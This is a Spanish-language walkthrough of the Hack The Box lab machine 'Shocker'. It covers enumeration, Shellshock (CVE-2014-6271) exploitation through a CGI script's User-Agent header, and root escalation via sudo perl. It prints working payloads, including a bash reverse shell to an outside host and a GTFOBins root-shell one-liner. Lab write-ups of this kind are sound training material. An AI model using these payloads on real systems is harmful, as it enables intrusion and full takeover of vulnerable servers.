# Shocker — Hack The Box

**Máquina:** Shocker · **SO:** Linux · **Dificultad:** Easy · **Lista:** TJ Null (OSCP)

| Campo | Detalle |
|---|---|
| Objetivo | `10.129.77.196` (Shocker) |
| Sistema | Linux — Ubuntu (Apache 2.4.18) |
| Vector de entrada | Shellshock (CVE-2014-6271) en script CGI |
| Escalada | sudo perl (GTFOBins) → root |
| Herramientas | nmap, gobuster, curl, netcat |

---

## 1. Resumen

Shocker expone un servidor web y SSH en un puerto no estándar. La entrada se consigue localizando un script CGI (`user.sh`) vulnerable a **Shellshock** (CVE-2014-6271), que permite ejecución remota de comandos a través de una cabecera HTTP. Se obtiene shell como **shelly** y se escala a **root** aprovechando un permiso sudo sobre el binario `perl`.

---

## 2. Enumeración

```console
$ nmap -p- 10.129.77.196
80/tcp   open  http
2222/tcp open  ssh (puerto no estándar)

$ nmap -sC -sV -p 80,2222 10.129.77.196
80/tcp   open  http  Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh   OpenSSH 7.2p2 Ubuntu
```

La web solo muestra una imagen ("Don't Bug Me!") — sin contenido útil → la entrada está oculta. Enumeración de rutas:

```console
$ gobuster dir -u http://10.129.77.196 -w /usr/share/wordlists/dirb/common.txt
cgi-bin/   (Status: 403)   ← carpeta de scripts CGI
```

`/cgi-bin/` existe (403 = no se lista, pero los archivos están ahí). Se buscan scripts dentro probando extensiones:

```console
$ gobuster dir -u http://10.129.77.196/cgi-bin/ -w .../common.txt -x sh,cgi,pl
user.sh   (Status: 200)   ← script CGI accesible
```

El script devuelve la salida del comando `uptime`:
```console
$ curl http://10.129.77.196/cgi-bin/user.sh
Just an uptime test script
 05:01:56 up 9 min,  0 users,  load average: 0.04, 0.02, 0.00
```

---

## 3. Explotación — Shellshock (CVE-2014-6271)

Shellshock es un fallo de **Bash**: los scripts CGI pasan las cabeceras HTTP (como el User-Agent) a Bash como variables de entorno. Con la firma `() { :; };` seguida de un comando, Bash lo ejecuta.

Prueba de ejecución de comandos (inyectando `id` en el User-Agent):
```console
$ curl -H 'User-Agent: () { :; }; echo; echo; /bin/bash -c "id"' http://10.129.77.196/cgi-bin/user.sh

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Ejecución confirmada como **shelly**. Se monta una reverse shell:
```console
# En Kali:
nc -lvnp 4444

# Reverse shell vía Shellshock:
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.15.195/4444 0>&1"' http://10.129.77.196/cgi-bin/user.sh
```
```console
shelly@Shocker:/usr/lib/cgi-bin$ whoami
shelly
```

---

## 4. Escalada: shelly → root (sudo perl)

Primer comando de la escalada:
```console
sudo -l
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

shelly puede ejecutar `perl` como root sin contraseña. Perl puede ejecutar comandos del sistema, así que correrlo como root da una shell de root. La técnica está documentada en **GTFOBins** (gtfobins.github.io):

```console
sudo perl -e 'exec "/bin/bash";'
whoami
root
```

> **La técnica (binario sudo + GTFOBins):** cualquier binario que puedas ejecutar como root con sudo y que permita ejecutar comandos o abrir una shell = escalada. GTFOBins lista cómo abusar cada binario. Aquí `perl -e 'exec "/bin/bash"'` abre una shell que hereda los privilegios de root.

---

## 5. Resumen de la cadena

| Fase | Acción | Resultado |
|---|---|---|
| Enumeración | nmap + gobuster | Puerto 80, /cgi-bin/, user.sh |
| Explotación | Shellshock (cabecera User-Agent) | Shell como shelly |
| Escalada | sudo perl (GTFOBins) | Shell como root |
| Flags | root.txt + user.txt | Máquina completada |
